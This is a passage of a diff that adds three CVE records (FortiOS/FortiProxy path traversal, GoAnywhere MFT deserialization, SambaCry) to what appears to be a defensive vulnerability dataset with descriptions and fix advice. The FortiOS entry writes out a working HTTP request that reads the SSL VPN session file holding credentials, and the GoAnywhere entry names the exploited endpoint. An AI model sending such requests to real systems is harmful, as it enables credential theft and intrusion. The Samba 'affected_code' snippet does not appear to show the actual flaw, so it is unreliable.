+    "description": "A path traversal vulnerability in Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.3 to 5.6.7 and 5.4.6 to 5.4.12 and FortiProxy 2.0.0, 1.2.0 to 1.2.8, 1.1.0 to 1.1.6, 1.0.0 to 1.0.7 allows unauthenticated attackers to download FortiOS system files through special crafted HTTP resource requests.",
+    "type": "Path Traversal",
+    "severity": "Critical",
+    "affected_software": "Fortinet FortiOS",
+    "affected_code": "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1\n// Reads sslvpn_websession file containing usernames and passwords",
+    "fix_pattern": "Apply Fortinet firmware updates. Reset all VPN credentials. Monitor for unauthorized access. Restrict SSL VPN to trusted networks."
+  },
+  {
+    "cve_id": "CVE-2023-0669",
+    "description": "GoAnywhere MFT accepts a user-controlled key that is passed to a deserialization function, allowing an attacker to execute arbitrary commands on the system. Commonly exploited by Clop ransomware group.",
+    "type": "Deserialization",
+    "severity": "Critical",
+    "affected_software": "Fortra GoAnywhere MFT",
+    "affected_code": "// Malicious serialized Java object sent to license response servlet\nPOST /goanywhere/lic/accept HTTP/1.1\nbundle=<serialized_java_object_with_command_execution>",
+    "fix_pattern": "Apply Fortra security patches. Restrict access to license response endpoint. Monitor for suspicious file uploads. Implement EDR on MFT servers."
+  },
+  {
+    "cve_id": "CVE-2017-7494",
+    "description": "Samba since version 3.5.0 is vulnerable to remote code execution, allowing a malicious client to upload a shared library to a writable share, and then cause the server to load and execute it. Known as SambaCry.",
+    "type": "Remote Code Execution",
+    "severity": "Critical",
+    "affected_software": "Samba",
+    "affected_code": "// Upload malicious .so library to writable share\n// Then request it via named pipe to trigger dlopen()\nNTSTATUS status = smbd_do_qfsinfo(conn, SMB_QUERY_FS_DEVICE_INFO);",
+    "fix_pattern": "Upgrade Samba to patched version (4.6.4, 4.5.10, 4.4.14+). Set 'nt pipe support = no' as interim fix. Restrict writable shares. Monitor for suspicious library uploads."
+  }
+]
